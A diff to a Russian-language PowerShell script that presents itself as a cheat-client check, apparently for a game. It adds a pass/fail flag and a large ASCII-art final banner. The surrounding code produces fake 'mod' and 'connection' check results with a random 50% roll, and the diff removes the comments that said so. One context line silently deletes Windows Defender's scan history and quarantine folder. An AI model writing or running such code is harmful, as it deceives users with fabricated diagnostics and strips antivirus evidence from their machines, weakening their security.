@@ -49,6 +49,7 @@ $foundCheatSites = @()
 $totalChecked = 0
 $totalDetected = 0
 $totalPassed = 0
+$finalStatus = $true  # true = пройдена, false = не пройдена
 
 foreach ($site in $cheatSites) {
     $totalChecked++
@@ -80,6 +81,7 @@ foreach ($site in $cheatSites) {
         Write-Host "            [!] Статус проверки: НЕ ПРОЙДЕНА" -ForegroundColor Red
         $foundCheatSites += $site.Name
         $totalDetected++
+        $finalStatus = $false
     } else {
         Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
         Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
@@ -120,6 +122,7 @@ foreach ($domain in $cheatDomains) {
             $foundCheatSites += $domain
             $totalDetected++
         }
+        $finalStatus = $false
     } else {
         Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
         Write-Host "            [OK] Статус проверки: ПРОЙДЕНА" -ForegroundColor Green
@@ -165,6 +168,7 @@ foreach ($path in $cheatPaths) {
                         Write-Host "            [!] Статус проверки: НЕ ПРОЙДЕНА" -ForegroundColor Red
                         $foundCheatSites += "$($file.Name)"
                         $totalDetected++
+                        $finalStatus = $false
                     } else {
                         Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                         Write-Host "            [OK] Статус проверки: ПРОЙДЕНА" -ForegroundColor Green
@@ -201,12 +205,12 @@ if ($foundCheatSites.Count -gt 0) {
     Write-Host "[+] Удаление и блокировка завершены." -ForegroundColor Green
     Write-Host "    Обнаружено: $totalDetected объектов" -ForegroundColor Yellow
     Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor Green
-    Write-Host "    Статус: НЕ ПРОЙДЕНА (обнаружены читы)" -ForegroundColor Red
+    $finalStatus = $false
 } else {
     Write-Host "[+] Чит-клиенты не обнаружены. Система чиста." -ForegroundColor Green
     Write-Host "    Проверено: $totalChecked сайтов" -ForegroundColor DarkGray
     Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor Green
-    Write-Host "    Статус: ПРОЙДЕНА (читы не найдены)" -ForegroundColor Green
+    $finalStatus = $true
 }
 Write-Host ""
 
@@ -217,7 +221,6 @@ foreach ($mod in $mods) {
     Write-Host "    -> Проверка $mod..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 150
     
-    # Шанс 50% на "обновление" мода
     $randomModResult = Get-Random -Minimum 1 -Maximum 100
     if ($randomModResult -le 50) {
         Write-Host "        [ОК] $mod версия актуальна" -ForegroundColor Green
@@ -251,7 +254,6 @@ foreach ($conn in $connections) {
     Write-Host "    -> Проверка $conn..." -ForegroundColor Gray
     Start-Sleep -Milliseconds 250
     
-    # Шанс 50% на "проблему" с соединением
     $randomConnResult = Get-Random -Minimum 1 -Maximum 100
     if ($randomConnResult -le 50) {
         Write-Host "        [ОК] Соединение установлено" -ForegroundColor Green
@@ -309,6 +311,42 @@ if ($Exe) {
 } else { Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red }
 
 Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray } Catch {}
+
+# ===== ФИНАЛЬНЫЙ СТАТУС ПРОВЕРКИ =====
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "            ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
+Write-Host "========================================" -ForegroundColor Cyan
+
+if ($finalStatus) {
+    Write-Host ""
+    Write-Host "    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Green
+    Write-Host "    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Green
+    Write-Host "    ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Green
+    Write-Host "    ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Green
+    Write-Host "    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
+    Write-Host "    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "    ============================================" -ForegroundColor Green
+    Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОЙДЕНА!" -ForegroundColor Green
+    Write-Host "    ============================================" -ForegroundColor Green
+    Write-Host "    Чит-клиенты не обнаружены." -ForegroundColor Green
+    Write-Host "    Ваша система защищена!" -ForegroundColor Green
+} else {
+    Write-Host ""
+    Write-Host "    ███╗   ██╗███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Red
+    Write-Host "    ████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Red
+    Write-Host "    ██╔██╗ ██║█████╗      ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Red
+    Write-Host "    ██║╚██╗██║██╔══╝      ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Red
+    Write-Host "    ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
+    Write-Host "    ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "    ============================================" -ForegroundColor Red
+    Write-Host "    ❌  ПРОВЕРКА НЕ ПРОЙДЕНА!" -ForegroundColor Red
+    Write-Host "    ============================================" -ForegroundColor Red
+    Write-Host "    Обнаружены чит-клиенты!" -ForegroundColor Red
+    Write-Host "    Требуется очистка системы!" -ForegroundColor Red
+}
 
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
